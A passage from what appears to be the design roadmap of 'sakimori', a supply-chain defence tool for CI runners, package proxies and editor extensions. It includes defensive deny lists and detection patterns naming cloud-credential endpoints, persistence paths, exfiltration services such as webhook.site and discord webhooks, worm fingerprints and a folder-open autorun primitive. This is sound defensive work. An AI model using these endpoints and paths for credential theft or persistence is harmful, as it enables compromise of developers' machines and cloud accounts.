    (Windows ETW) leave `source: None` for now.
12. **Job-scoped supervised mode** — ✅ implemented across two surfaces.
    - **Binary** (v0.35): `sakimori daemon start` / `daemon stop`.
      `start --observe-cgroup-of <pid>` reads `/proc/<pid>/cgroup`,
      finds the v2 unified path, and attaches connect4/connect6 +
      tracepoint programs to *that existing cgroup* — no process
      migration. The runner's own cgroup management is left untouched
      and cgroup v2 descendant inheritance does the cross-step work
      for free. Daemon parks until SIGTERM, then writes the same
      JSON / step-summary / HTML report `sakimori run` produces.
      `stop` sends SIGTERM via the pid-file and waits for clean
      exit; idempotent on missing / stale pid-files. Block-mode
      denial surfaces via `::error::` annotations from the daemon's
      stderr + a non-zero post-step exit code parsed back from the
      JSON log (the daemon's own exit code can't propagate through
      `stop`).
    - **Action** (`bokuweb/sakimori/job@v0`): subpath JS action with
      pre/main/post hooks. `pre.js` installs sakimori, spawns
      `sudo sakimori daemon start --observe-cgroup-of $PPID`
      detached with stdio→files, and polls for the pid-file before
      letting other steps run. `post.js` issues `daemon stop`,
      drains the daemon's stderr, and re-parses the JSON log to
      fail the job in block mode. Zero JS deps — pre/main/post read
      `INPUT_*` straight from env and shell out for the heavy
      lifting. Linux only. The original composite
      `bokuweb/sakimori@v0` (single-step + Windows) is untouched.

      `pre.js` honours pre-set `SAKIMORI_BIN` + `SAKIMORI_BPF_OBJ`
      env to skip the `gh release download` path — used by the
      `job-scoped-smoke` CI job to test the action against a
      locally-built binary, also useful for air-gapped mirrors.

      Sub-action `bokuweb/sakimori/job/stop@v0` (composite, one
      step) is a 1-line shortcut for the "flush the daemon early
      before `actions/upload-artifact` inside the same job"
      pattern. Replaces the previous 4-line `sudo -n -E
      $SAKIMORI_BIN daemon stop --pid-file $SAKIMORI_JOB_PIDFILE`
      snippet so consumer workflows don't have to know about
      pid-files or sudo. Idempotent + Linux-only-no-op so it can
      be dropped into cross-OS matrices unchanged.

      **Out of scope for this iteration**: container jobs
      (`jobs.<id>.container:`) — the host-side cgroup attach can't
      reach steps that run inside the container. `pre.js` detects
      `/.dockerenv` and known container-y `/proc/1/cgroup` patterns
      and emits a `::warning::` rather than hard-failing, since the
      daemon's own attach error is the real source of truth. Also
      out of scope: matrix / reusable-workflow shards (each is its
      own Runner.Worker = its own job = needs its own
      `bokuweb/sakimori/job@v0`).
13. **GHA cache-poisoning lint** (TanStack-style PR-cache attack) —
    ✅ implemented as workflow-level rules in `sakimori actions
    audit`. Two sibling rules, each emitting its own Error finding
    in the `workflow_findings` array (file-scoped, not
    `uses:`-scoped):
    - `pull_request_target_with_cache_write` — fires when `on:`
      contains `pull_request_target` or `workflow_run` **and** any
      job step writes to the Actions cache. Cache writer matchers:
      `actions/cache@*`, `actions/cache/save@*`, `actions/setup-*`
      with a truthy `with.cache:` input, `actions/setup-go` (which
      defaults to caching on — fires unless `with.cache: false`),
      `Swatinem/rust-cache`, `mozilla-actions/sccache-action`, and
      `astral-sh/setup-uv` with `enable-cache: true`. Reason: cache
      writes use a runner-internal token, not the workflow
      `GITHUB_TOKEN`, so `permissions: contents: read` does not
      block them — this is the **TanStack npm supply-chain
      compromise (2025)** vector.
    - `pull_request_target_with_untrusted_checkout` (added per the
      TanStack post-mortem) — fires when a privileged trigger
      checks out the PR head via `actions/checkout` with
      `with.ref:` resolving to a head-ish expression
      (`github.event.pull_request.head.{sha,ref,repo}`,
      `github.head_ref`, `github.event.workflow_run.head_{sha,
      branch}`, or a literal `refs/pull/…`). Bare `actions/checkout`
      under `pull_request_target` is safe-by-default (it checks out
      the base commit), so the rule explicitly only fires on an
      explicit head-ish ref — same shape zizmor's
      `dangerous-triggers` audit catches.

    Out of scope: cache writes inside `run:` scripts (raw `gh
    actions-cache` calls); cache writes by hand-rolled `pnpm/
    action-setup`-style wrappers; pruning false positives when the
    cache key is provably untouchable from the PR side — all
    follow-ups.

    **Follow-ups surfaced by the TanStack post-mortem**:
    - **CODEOWNERS-for-`.github/` lint** — ✅ implemented as
      `sakimori actions audit-repo <root>`. Walks the three
      canonical CODEOWNERS locations (`.github/CODEOWNERS`,
      `CODEOWNERS`, `docs/CODEOWNERS`) in GitHub's documented order,
      parses pattern + owner rules, and reports whether any rule
      with at least one owner token (`@user`, `@org/team`, or an
      email) covers `.github/workflows/foo.yml` and
      `.github/dependabot.yml`. Surfaces the matched rule (pattern,
      owners, line number) so reviewers can jump straight to the
      gate. The subcommand also walks `.github/workflows/*.{yml,
      yaml}` and runs the per-file `audit` checks for free — one
      repo-level invocation covers SHA-pinning, cache-poisoning,
      untrusted-checkout, and ownership in a single report. Default
      severity for a missing CODEOWNERS rule is Warn (most repos
      historically didn't gate `.github/`; we don't want to break
      their first audit run); `--strict-codeowners` escalates to
      Error / non-zero exit. The matcher implements enough of
      gitignore semantics for `.github/` gating (`*`, `**`, leading
      `/` anchoring, trailing `/` directory-only) — character
      classes and `?` are deliberately out of scope.
    - **`zizmor` parity surface** — sakimori's two rules cover the
      cache-poisoning + dangerous-checkout slices; zizmor catches
      a wider set (`template-injection`, `excessive-permissions`,
      `unpinned-uses` overlap, `artipacked`, etc.). Open question
      whether to grow native rules or ship a `sakimori actions
      audit --via-zizmor` wrapper that installs+runs zizmor and
      merges its SARIF into the same `workflow_findings` shape.
      Native is more honest about what we actually validate;
      wrapper is faster to ship and keeps us aligned with their
      rule cadence. TanStack themselves chose to adopt zizmor —
      not building it themselves is a reasonable signal.
14. **`sakimori deps verify-cache`** — hash the package manager's
    local cache against the lockfile's `integrity:` fields before
    install. Detects the *content* half of the TanStack vector:
    `actions/cache` restored a tarball into the local store, but
    the bytes don't match what the lockfile pinned. Lockfiles ship
    SRI-style integrity hashes (`sha512-<base64>`) per resolved
    `(name, version)`; package managers populate content-addressed
    stores. The verifier walks each store, re-hashes every file
    referenced by the lockfile, and reports `ok` / `missing` /
    `mismatch`. Exits non-zero on any mismatch. **Implemented:**
    - **npm cacache** (`package-lock.json`) — `content-v2/<algo>/
      <aa>/<bb>/<rest>`; filename *is* the hex digest, so the check
      is "re-hash file, compare to lockfile integrity".
    - **pnpm store v3** (`pnpm-lock.yaml`) — lockfile integrity is
      the *tarball* SRI; it keys an on-disk `<store>/v3/files/<aa>/
      <rest>-index.json` listing per-file `(integrity, mode, size)`
      tuples. Verifier reads that index and re-hashes every blob
      (`<rest>` for regular, `<rest>-exec` when `mode & 0o111`).
      Handles both v6-v8 (`/name/ver`) and v9 (`name@ver`) spec
      forms, plus the `_peer@ver` / `(peer@ver)` annotations.
      Honest limitation documented in the module: a fully
      coordinated rewrite of both the index.json and every blob
      verifies clean — we can't re-derive the tarball hash without
      the .tgz, which pnpm discards. Catches the realistic single-
      file tampering pattern. **pnpm v11+** (note: v10 still uses
      JSON; SQLite ships in the next major after v10) replaces the
      per-package index.json with a single `<store>/index.db`
      SQLite database keyed by `${integrity}\t${pkgId}`. The
      verifier detects `<store>/v11/index.db` and short-circuits
      every entry to `Unsupported` rather than silently passing.
      Implementation footgun: the BLOB values are encoded with
      msgpackr's `useRecords: true` extension, which is **not
      standard msgpack** — `rmp-serde` / `rmp` will mis-decode it.
      A reader needs either (a) a hand-rolled msgpackr-records
      decoder (~100-200 lines; ext-type 0x69 introduces a record
      shape, subsequent occurrences reference it by id) or (b) a
      Node sidecar invoking `msgpackr.unpack`. See
      `https://github.com/pnpm/pnpm/blob/main/store/index/src/index.ts`
      and `https://github.com/kriszyp/msgpackr#structured-cloning--records`.
    - **cargo registry** (`Cargo.lock`) — each `[[package]]` from a
      registry source carries `checksum = "<hex>"` (SHA-256 of the
      .crate tarball, the same value as the sparse-index `cksum`).
      Verifier walks every `$CARGO_HOME/registry/cache/<reg>/`
      (basename opaque — sparse + legacy git + alt registries can
      coexist) looking for `<name>-<version>.crate`, hashes it, and
      compares. Cargo re-verifies per-file hashes via
      `.cargo-checksum.json` at build time, so the .crate tarball
      check is the bit that adds defence against cache-layer
      tampering specifically.

    **Action surface**: `bokuweb/sakimori/verify-cache@v0` (node20
    sub-action) wraps the CLI as a one-line GitHub Actions step.
    Auto-detects ecosystem from the lockfile basename, picks the
    default cache root for the runner OS, propagates the CLI exit
    code. Designed to drop in right after the install step.

    Doesn't replace `deps check` (release-age) — pairs with it:
    age check at fetch time, cache verify between cache-restore
    and install. Remaining follow-up: pnpm v11 SQLite + msgpackr-
    records reader (see above for the implementation footgun).
15. **Lifecycle-script gate in the proxy** (Shai-Hulud-class
    defence) — ✅ first slice implemented in `sakimori-proxy`.
    New `sakimori proxy start --lifecycle-policy <audit|block|strip>`
    flag plus a repeatable `--lifecycle-allow <pkg>` for
    legitimate native-addon exemptions (e.g. `sharp`, `bcrypt`).

    **Phase 1 of `strip` mode (current):** the rewriter itself —
    `sakimori_proxy::lifecycle::strip_npm_tarball` — is the
    load-bearing algorithmic piece and is implemented + unit-tested:
    hard limits against gzip bombs / oversize tarballs / pathological
    entry counts, zip-slip path validation (defence in depth even
    though we never extract to disk), symlink + hardlink + directory
    preservation, and SHA-512 / SHA-1 hash recomputation matching the
    `dist.integrity` / `dist.shasum` shapes npm verifies. `serde_json`
    is now built with `preserve_order` workspace-wide so the
    rewritten `package.json` differs from the input only in the
    removed lifecycle keys (byte-stable surrounding content).
    `StripFailurePolicy` (`Block` default / `Passthrough`) is the
    "rewriter itself failed, now what" knob — type lands here, CLI
    wiring with Phase 2.

    **Honest scope (after Codex plan review):** lockfile-pinned
    installs (`npm ci`, `npm install` against an existing
    `package-lock.json`, `pnpm install --frozen-lockfile`) validate
    fetched tarballs against the **lockfile's** `integrity` field,
    not the packument's, and the proxy cannot rewrite an on-disk
    lockfile. Strip is therefore best-effort for non-lockfile
    install paths only — `npm install <new-pkg>`, `npx`,
    `pnpm dlx`, `yarn dlx`, `pnpm add <new-pkg>`. CI lockfile flows
    stay on `--lifecycle-policy block`.

    **Phase 2 (current) — strip works end-to-end.** Landed in this
    slice:
    (a) `crate::strip_cache::StripCache`, an in-memory
    `Arc<Mutex<HashMap<(name, version, orig_integrity), StripCacheEntry>>>`
    shared between the tarball handler and the packument rewriter.
    Cache key includes the upstream's original SRI hash so a mirror
    serving different bytes for the same `(name, version)` cannot
    poison the cache.
    (b) `rewrite_npm::apply_strip_cache_to_packument` walks every
    surviving version after age/provenance filtering: matched
    `Stripped` entries get `dist.integrity` / `dist.shasum`
    overwritten with the new values and `dist.attestations` dropped
    (the provenance signature is over the original bytes; leaving
    it would mislead any `npm install --provenance` flow into
    verifying a stale signature against rewritten bytes).
    `NoStripNeeded` entries leave metadata alone.
    (c) `speculative_pre_strip_packument` in `proxy.rs` runs after
    the existing rewriter when policy = `Strip`. It identifies
    `dist-tags.latest` (post-rewrite), fetches that tarball directly
    upstream via a synchronous `ureq` request inside
    `spawn_blocking`, runs `strip_npm_tarball`, validates the
    fetched bytes match the advertised integrity (mirror-poisoning
    defence), populates the cache, and re-applies the cache to the
    packument. Bounded by a hard 10-second wall-clock timeout +
    8-second per-request HTTP timeout; on any failure the packument
    flows through unchanged and the lazy tarball-path strip takes
    over.
    (d) Tarball handler under Strip no longer 403s. It hashes the
    upstream body, looks up `(name, version, orig_integrity)` in
    the cache: a `Stripped` hit serves the cached rewritten bytes;
    a `NoStripNeeded` hit (rare race condition) passes original
    bytes through; a miss runs `strip_npm_tarball` on the fresh
    bytes, populates the cache, and serves the rewritten bytes.
    Rewriter failures route through
    `--lifecycle-strip-on-failure {block,passthrough}` (default
    `block`).

    **What still doesn't work end-to-end:** explicit pinned
    non-latest installs (`npm install pkg@1.2.3` for a version that
    isn't `dist-tags.latest`) hit the tarball path with the
    original packument integrity, so the first attempt fails
    `EINTEGRITY`; a retry succeeds because the lazy strip on the
    first attempt populated the cache. This is documented in the
    `--lifecycle-policy strip` help text.

    **Phase 2b — persistent on-disk strip cache.** Landed. The
    cache now optionally writes through to
    `~/.sakimori/strip-cache/` (default when strip policy is
    active; override with `--lifecycle-strip-cache-dir <DIR>`;
    disable with `--lifecycle-no-strip-cache`). Layout is flat:
    `<sha256(name|version|orig_integrity)>.json` metadata paired
    with a sibling `.tgz` body file (omitted for `NoStripNeeded`
    entries). Writes are atomic — `tmp` + `rename` after `sync_data`
    — so a crashed proxy never leaves a torn record. Schema is
    versioned (`v: 1`); future-version entries are skipped with a
    warn log rather than mis-decoded. On startup the cache loads
    every valid entry into the in-memory map, so a restarted proxy
    immediately hits the same `(name, version)` warm — `npx`-style
    ephemeral runs and lockfile-pinned re-installs of versions the
    proxy has seen before no longer pay the `EINTEGRITY`-then-retry
    cost across restarts. No eviction in v0; operators that need
    bounded growth `rm -rf` the directory.

    PyPI sdist strip stays out of scope (different threat model —
    `setup.py` removal breaks the build).

    Implementation: `crates/sakimori-proxy/src/lifecycle.rs`
    decodes the gzipped tarball, walks tar entries to find the
    root `package/package.json` (nested `node_modules/*/package.json`
    are deliberately ignored — bundled-dep scripts are a separate
    threat model that lockfile pinning is supposed to cover),
    parses `scripts.{preinstall,install,postinstall,prepare}`,
    and returns an `Inspection { scripts: [...] }`. The
    `ProxyHandler` captures `last_npm_tarball: (name, version)`
    in `handle_request` for pinned npm tarball URLs and consults
    it in `handle_response`: Audit mode logs script bodies and
    passes the tarball through unchanged; Block mode returns 403
    with `x-sakimori-deny: lifecycle-script` so npm never runs
    the script. Bytes-don't-parse-as-gzip and `package.json`-
    missing both fail open with a warning log — defence shouldn't
    invent rejections for non-standard-but-legitimate artefacts.

    Follow-ups: (a) `strip` mode — rewrite the tarball, drop the
    scripts entries, regenerate gzip; equivalent to a per-package
    `--ignore-scripts` without needing user buy-in across every
    install command. Substantially larger because we have to
    re-emit a valid tar+gz and the integrity hash npm later
    consults must match the *original* sparse-index entry — the
    proxy will also need to rewrite the packument's
    `dist.integrity` for affected versions. (b) PyPI parallel —
    ✅ first slice implemented as `inspect_pypi_sdist` in
    `crates/sakimori-proxy/src/lifecycle.rs`. When
    `--lifecycle-policy` is on and a request matches a pinned PyPI
    *sdist* URL (`.tar.gz` / `.tgz` / `.zip` — wheels are skipped
    because they carry no install-time hook surface), the proxy
    buffers the response, walks the tarball for a top-level
    `setup.py` and `pyproject.toml`, and decides:
    - **Audit**: log `has_setup_py`, the declared `build-backend`
      (`hatchling.build`, `setuptools.build_meta`,
      `poetry.core.masonry.api`, etc.), and the declared
      `build-requires`; pass the body through.
    - **Block**: 403 with `x-sakimori-deny: lifecycle-script` when
      the sdist ships `setup.py` (the legacy PEP-517-era unbounded
      installer hook — same threat model as npm's `postinstall`).
      Modern pyproject-only sdists pass through with the audit log
      entry; backend-name denylisting was deliberately left out of
      the first slice (no clean list exists and Hatch/Maturin
      false-positives would dominate). Allow-list (`--lifecycle-allow
      <pkg>`) honoured the same way as npm. Same fail-open
      semantics: bytes-don't-parse-as-gzip / nested setup.py / TOML
      garbage all yield "could not inspect; passing through" + a
      warn log, never a fabricated 403. Pairs naturally with `deps
      watch` — the proxy is the only layer that can catch the
      script *before* it runs.
16. **Persistence-write rule pack** (Shai-Hulud-class defence) —
    ✅ first slice implemented as `sakimori policy preset
    persistence`. Emits a ready-to-merge YAML block populating
    `file.default: allow` + `file.deny: [...]` with the eight
    highest-signal persistence paths: `~/.ssh/`,
    `~/Library/LaunchAgents/`,
    `/Library/Launch{Agents,Daemons}/`,
    `~/.config/systemd/user/`, `/etc/systemd/system/`,
    `~/.bashrc`, `~/.zshrc`. List size is bounded by the
    kernel-side block cap (`FILE_DENY_MAX_ENTRIES = 8`) so the
    output validates under `mode: block` without trimming. `$HOME`
    is expanded at emit time (the policy parser does not expand
    `~` itself) with a `--home` override for generating
    cross-machine policies. `mode: audit` is the default in the
    emitted YAML so users see what their build legitimately
    touches before flipping to block. Commented-out follow-ups
    (cron spool dirs, `.bash_profile`/`.zprofile`/`.profile`,
    `.vscode/tasks.json`, `.claude/*.mjs`) document the gaps the
    kernel cap forced — extend if you can spare slots.
    Workspace-local hooks remain better surfaced by
    `--snapshot-workspace` (#9). Combined with the v0.23
    attribution layer, a write to any of these paths from a
    package-manager-attributed subtree is the highest-confidence
    "this install is malicious" signal sakimori can produce.
17. **Cloud-credential exfiltration tripwire** (Shai-Hulud-class
    defence) — ✅ first slice implemented as `sakimori policy
    preset cloud-secret-egress`. Emits `network.default: allow` +
    `network.deny: [...]` covering AWS/GCP/Azure IMDS
    (`169.254.169.254`), `metadata.google.internal`,
    `sts.amazonaws.com`, `secretsmanager.us-east-1.amazonaws.com`,
    `ssm.us-east-1.amazonaws.com`, `vault.service.consul`, and
    `vstoken.actions.githubusercontent.com` (the GHA OIDC token
    mint). Regional AWS endpoints are intentionally explicit
    rather than wildcard — `NetRule.target` does not support
    middle-string wildcards and the SNI proxy grammar only accepts
    leading `*.`. Pairs naturally with v0.33's SNI-based proxy
    egress filter so the rule fires on the *hostname the client
    asked for*, not a CDN-rotated IP.

    Observability half: ✅ implemented as
    `sakimori-core::cloud_secrets`. Post-run, the supervisor scans
    the sampled Connect events; any whose `daddr` (or resolved
    `hostname`) matches the canonical list **and** whose attribution
    names a package-manager ancestor is surfaced as a `Hit { category,
    target, pid, comm, denied, package_manager }`. Hits land in the
    JSON log under the dedicated `cloud_secret_egress` array and in
    the step summary as a "🛑 Cloud-secret egress" section with a
    DENY/ALLOW verdict column — the allow case matters because the
    signal is "this install just tried to read creds", not "this
    install succeeded at reading creds". Lists are a single source
    of truth shared with `policy preset cloud-secret-egress`. The
    host matcher is component-aligned suffix (so a proper subdomain
    like `regional.sts.amazonaws.com` hits, but
    `attacker-sts.amazonaws.com.evil.tld` does not). Quiet on clean
    runs.

    Remaining follow-up: richer wildcard pack via the proxy once
    `*.amazonaws.com`-style entries can be ingested without a
    NetRule grammar change.
18. **Known-IOC workspace scanner** — ✅ first slice implemented as
    `sakimori-core::iocs` + two CLI surfaces:
    - `sakimori workspace diff` now scans every added/modified path
      against the bundled catalog by default (suppress with
      `--no-check-iocs`). Findings render as a separate `❌ N
      known-IOC hit(s)` block below the generic drift output and a
      High-severity hit forces exit 1 even with `--allow-drift` —
      the flag is meant for "I expect drift", not "I expect a
      known-malicious fingerprint". JSON output gains an `iocs:
      { catalog_version, findings: [...] }` object alongside the
      existing diff fields.
    - `sakimori workspace scan-iocs <dir>` is the standalone form —
      walks the directory (honouring the same skip-list as
      `snapshot`) and reports without needing a baseline. `--strict`
      escalates Medium hits to exit 1.

    Catalog (`CATALOG_VERSION = 2026.05.15`) covers the
    high-confidence Shai-Hulud fingerprints (`.claude/setup.mjs`,
    `shai-hulud-data.json`, `.github/workflows/shai-hulud-workflow.yml`
    — all High) plus two Medium-severity generics
    (`.github/workflows/codeql_analysis.yml`, basename `.npmrc` for
    token-exfiltration / registry-redirection). Matching is
    path-based with two kinds: `PathSuffix` (component-aligned, so
    `.claude/setup.mjs` matches `subdir/.claude/setup.mjs` but not
    `claude/setup.mjs`) and `Basename` (exact basename).

    ✅ Wired into `sakimori run --snapshot-workspace` and `sakimori
    daemon start --workspace-baseline …`: drift's added/modified
    paths are scanned against the same catalog at shutdown,
    findings surface in the JSON log under `workspace_iocs` and in
    the step summary as a "❌ Known-IOC hits" table with severity
    badges (🛑 HIGH / ⚠️ MED) and catalog version. A High-severity
    hit forces exit 1 in *any* mode (Audit too) via a
    `::error title=sakimori::known-IOC hit:` annotation — the
    fingerprint is "this is a known supply-chain worm artefact",
    not a policy call the user might want to override with
    `--allow-drift`.

    HTML report integration: ✅ when a supervised run produces a
    workspace baseline + IOC scan, the HTML report now renders a
    "Known-IOC hits" section between the events table and the
    drift block, mirroring the step-summary layout (per-row
    severity chip + catalog version in the hint). High-severity
    presence escalates the section badge from warn to danger so
    the worm fingerprint stands out at a glance.

    Content-based fingerprints: ✅ implemented as
    `RuleKind::ContentNeedle { needle, basename_filter }` + a new
    `scan_paths_in_root(root, paths)` entry point that reads each
    file once (capped at `MAX_CONTENT_BYTES = 64 KiB`) and runs
    case-insensitive substring matches. Initial needles cover the
    canonical low-effort exfil endpoints — `webhook.site`,
    `discord.com/api/webhooks/`, `requestbin.com` — all High
    severity because legitimate workspace files essentially never
    embed them. Path-only callers stay on `scan_paths(paths)` with
    no behaviour change; supervisor / daemon / `workspace diff` /
    `workspace scan-iocs` were re-wired to pass the workspace root
    so content rules light up automatically.

    Remaining follow-ups: the `{dune_word}-{dune_word}-{3-digit}`
    repo-name and authored-by-Claude commit indicators (both
    require GitHub API rather than local file walk); `sakimori iocs
    update` for a signed-YAML refresh path so the catalog can move
    faster than the release cadence; additional content needles
    (dropper-signature bytes, base64-encoded private-key headers)
    as reproducible samples surface.

### Editor-extension coverage (VSCode / Cursor / Chrome)

The 2026-05 GitHub-internal-repo compromise (poisoned VS Code
extension on an employee device) made it explicit: editor and
browser extensions are a parallel distribution channel sakimori
doesn't currently cover. The fetch path is HTTPS, the install
artefact has a structured manifest, and the runtime parent is a
known editor binary — all three properties the existing proxy +
attribution + IOC catalog were designed for. Roadmap entries
below are listed in implementation order; #19 is the cheapest
and lights up the most existing detection for free.

19. **Attribution: recognise editor binaries as a tool root.**
    The v0.23 attribution layer walks PPid up from each event
    until it finds a known `argv[0]` (npm, cargo, pip, …) and
    stamps `source: <pm>` on the event. Add `code`,
    `code-server`, `cursor`, `windsurf`, `code-helper`
    (electron renderer/plugin host basename on macOS) to the
    recognised set. The moment those are in,
    `cloud_secrets::scan` (#17), the persistence-write rule pack
    (#16), and the IOC scanner (#18) all attribute extension-
    spawned syscalls back to the editor — i.e. "VSCode extension
    just opened `~/.ssh/id_ed25519`" surfaces in the existing
    JSON log + step summary + HTML report with no further
    changes. Smallest possible diff, largest immediate value.
    Naming caveat: the enum is currently `PackageManager`; an
    editor isn't strictly that, but the field is semantically
    "attribution root". Future rename optional, not required for
    this slice.

20. **Marketplace as a proxy ecosystem (release-age + IOC pin).**
    Treat `marketplace.visualstudio.com`, `open-vsx.org`, and the
    Chrome Web Store update endpoint (`clients2.google.com/
    service/update2/crx`) as new ecosystems in `RegistryHosts`.
    - **VSCode Marketplace + OpenVSX**: ✅ first slice implemented
      as `crate::rewrite_vscode::rewrite_extensionquery_json`.
      `RegistryHosts` gains a `vscode_marketplace` list defaulting
      to both canonical hosts; the proxy recognises the
      `POST /_apis/public/gallery/extensionquery` (MS) and
      `POST /vscode/gallery/extensionquery` (OpenVSX compat shim)
      endpoints in `classify_response` and routes the JSON
      response to the rewriter. Filtering walks every
      `results[].extensions[].versions[]` array and drops entries
      whose `lastUpdated` is younger than `--min-age` — same
      silent-fallback model the npm packument rewriter uses. If
      every version of an extension is dropped, the rewriter
      leaves the `extensions[]` entry in place with an empty
      `versions: []` so the editor surfaces a clean "no
      installable version" error instead of silently dropping the
      extension (which would mask legitimate missing-on-mirror
      cases). Missing / unparseable `lastUpdated` fails open per
      `serde_json` policy; the tarball-pin lifecycle gate (#21) is
      the backstop. `--vscode-marketplace-registry <HOST>`
      (repeatable) teaches the proxy about corp-internal galleries
      that speak the same envelope.
    - Chrome Web Store update XML carries no publish timestamp
      inline; needs an out-of-band lookup to the web-store detail
      page or the unofficial JSON endpoint, cached per-extension
      like the NuGet flat-container resolver. Fail-open with a
      warn log if the lookup fails. **Not yet implemented.**

    Pairs with the SNI allow-list (#8) so corp installs can lock
    to internal extension mirrors and forbid the public hosts.

21. **`.vsix` / `.crx` lifecycle gate.**
    ✅ inspector library landed as `sakimori-proxy::vsix_inspect`.
    `inspect_vsix(body)` opens the OPC zip, pulls
    `extension/package.json`, and returns
    `VsixInspection { name, publisher, version, activation_events,
    main, fires_on_startup }`. The `fires_on_startup` bool flags
    the two startup-autorun shapes (`"*"` wildcard and
    `onStartupFinished`) — the highest-blast-radius VSCode
    activation primitives, and the ones recent supply-chain
    droppers favour. Hard ceilings (`MAX_VSIX_BYTES = 100 MiB`,
    `MAX_PACKAGE_JSON_BYTES = 1 MiB`) keep a malicious zip from
    stalling the proxy. Fail-open shape mirrors the npm
    inspector: corrupt zip / missing manifest / unparseable JSON
    return the default Inspection, defence does not fabricate
    denials on malformed-but-legitimate artefacts.

    Proxy integration landed in this slice: `parse_vsix_download_path`
    recognises both the canonical Marketplace shape
    (`/_apis/public/gallery/publishers/<pub>/vsextensions/<ext>/<ver>/vspackage`)
    and OpenVSX's REST shape (`/api/<ns>/<ext>/<ver>/file/<…>.vsix`).
    When `--lifecycle-policy` is on and the response is for a
    matching URL on a configured `vscode_marketplace` host, the proxy
    buffers the `.vsix` bytes, runs `vsix_inspect::inspect_vsix`, and
    in **Audit** mode logs the manifest (publisher, name, version,
    `activationEvents`, `main`) for any extension that fires on
    startup; in **Block** mode returns 403 with
    `x-sakimori-deny: lifecycle-vsix` when `fires_on_startup` is true
    (the wildcard `"*"` and `onStartupFinished` activation
    primitives). Lazy activation (`onCommand:…`, `onLanguage:…`,
    `workspaceContains:…`, no `activationEvents` at all) passes
    through. Allow-list keys are canonical `publisher.name`
    identifiers, case-insensitive — same shape VS Code itself uses.
    `Strip` policy on `.vsix` falls back to `Block` semantics: the
    Marketplace integrity hash the editor verifies covers the
    archive bytes, so an in-place rewrite would be rejected.

    Still pending: strip mode is effectively out of scope (the
    Marketplace integrity hash + Microsoft signed-package flow
    cover the archive bytes, so an in-place rewrite would be
    rejected). `.crx` (Chrome extensions) audit is still pending;
    `.crx` is signed end-to-end so strip is impossible by design,
    audit/block only. `main` JS body scanning belongs naturally in
    `iocs::ContentNeedle` rather than here.

22. **Extension installs in the `InstallEvent` inventory.**
    ✅ VS Code half implemented. `Ecosystem::VscodeExtension`
    (label `"vscode-extension"`) is now a sibling of `Git` in
    `sakimori-core::deps`. The proxy recognises pinned `.vsix`
    download URLs on configured `vscode_marketplace` hosts (the
    canonical Marketplace `/_apis/.../vspackage` shape and OpenVSX
    `/api/<ns>/<ext>/<ver>/file/<…>.vsix`) and emits an
    `InstallEvent` with name = `publisher.extension` for every
    fetch, regardless of `--lifecycle-policy`. The same event
    flows through `install_logger` (`~/.sakimori/installs.jsonl`)
    and the OTLP exporter when configured. `Decider` /
    `KnownBadOracle` / typosquat / OSV exhaustive matches all
    return None — the variant carries no publish-time, OSV
    ecosystem, or top-N typosquat list, the same way `Git` does.

    `sakimori advisories scan` already iterates every
    `InstallEvent` in the log and queries OSV. Because
    `eco_to_osv(VscodeExtension)` returns `None`, those entries
    are silently skipped today — once OSV.dev publishes a
    `vscode-marketplace` ecosystem (or we mirror GitHub Advisory
    Database's VSCode advisories), the JOIN will light up with
    zero further proxy changes.

    `ChromeExtension` is still pending and gated on roadmap #20's
    Chrome Web Store half (no inline publish-time means the
    update endpoint needs an out-of-band lookup we haven't built).
    Once that lands the same `InstallEvent` pattern extends
    naturally.

23. **Workspace `.vscode/` / `.cursor/` as known-IOC surface.**
    ✅ first rule landed in catalog v2026.05.21:
    `vscode.tasks-folderopen-autorun` is a `ContentNeedle`
    constrained to basename `tasks.json` matching the literal
    `"runOn": "folderOpen"` key/value. That's the canonical VSCode
    primitive for "execute on workspace open" — a clean repo
    essentially never ships it, and the value-string is specific
    enough that the basename filter alone keeps false positives
    near zero. Severity High, family `editor-extension`. Cursor's
    `.cursor/tasks.json` rides the same rule (basename match is
    parent-directory-agnostic).

    Still pending: settings.json `terminal.integrated.profiles.*.args`
    needing shell-redirected commands (substring matching alone
    yields too many false positives; needs structural parsing —
    follow-up), and `extensions.json` recommendations from
    non-canonical publishers (heuristic; legitimate teams pin
    private extensions all the time, can't ship as a hard rule).

24. **Editor extension directory tamper detection.**
    ✅ library surface implemented as
    `sakimori-core::editor_extensions`:
    `default_roots($HOME)` auto-detects `~/.vscode/extensions/`,
    `~/.vscode-insiders/extensions/`, `~/.cursor/extensions/`,
    `~/.windsurf/extensions/`, and the platform-appropriate
    VS Code `User/globalStorage/` (Linux:
    `$XDG_CONFIG_HOME/Code/User/globalStorage`, macOS:
    `~/Library/Application Support/Code/User/globalStorage`,
    Windows: `%APPDATA%\Code\User\globalStorage`). Only roots that
    exist on disk at call time are returned, so a user without
    Cursor doesn't see an empty namespace polluting their diff.
    `snapshot_roots(&roots, &opts)` walks each root with the
    existing `tamper::Snapshot` machinery and merges into one
    diffable artefact, prefixing every path with the root's label
    (`vscode-extensions/foo.bar-1.0.0/package.json`) so the same
    extension id under two editors doesn't collide.

    Reuses the existing `tamper::diff` so all downstream
    consumers — `workspace diff`, the JSON log, the HTML report,
    the IOC scanner — work unchanged on the merged snapshot.

    ✅ CLI wired as `sakimori extensions snapshot` /
    `sakimori extensions diff`. Snapshot emits a merged JSON to
    stdout (or `--output FILE`); diff reads a baseline, walks the
    discovered roots, and reports added/modified/removed entries
    plus a per-root IOC scan that re-uses the v2026.05.21 catalog
    (so `vscode.tasks-folderopen-autorun` fires on a poisoned
    sideload's `tasks.json`, and the existing Shai-Hulud / exfil
    needles fire on any extension code that ships them). High-
    severity IOC hits force exit 1 unconditionally; structural
    drift exits 1 unless `--allow-drift`. `--home <DIR>` is the
    test/CI escape hatch.

    ✅ Wired into `sakimori run --snapshot-extensions` and
    `sakimori daemon start --snapshot-extensions`. Both surfaces
    take a baseline + a full pre-run IOC sweep (the "host was
    already poisoned before sakimori attached" signal) before the
    supervised step starts, then re-discover roots at shutdown
    (catches roots created mid-run) and diff against the baseline.
    Three sibling top-level JSON keys land in the report:
    `extension_drift` (structural diff, same shape as
    `workspace_drift`), `extension_iocs` (catalog hits on
    added/modified paths during the run), and
    `extension_iocs_baseline` (catalog hits on the pre-run
    snapshot). The step summary and HTML report grow three matching
    sections. High-severity IOC hits in **either** bucket fail the
    run unconditionally in any mode — these are known supply-chain
    worm fingerprints, not policy calls. Structural drift alone
    fails the run only in block mode, mirroring `workspace_drift`.
    `$HOME` is canonicalised + sanity-checked (refuses `/`, empty
    string) before any walk, so a misconfigured runner can't
    accidentally scan the entire filesystem under the flag. Test
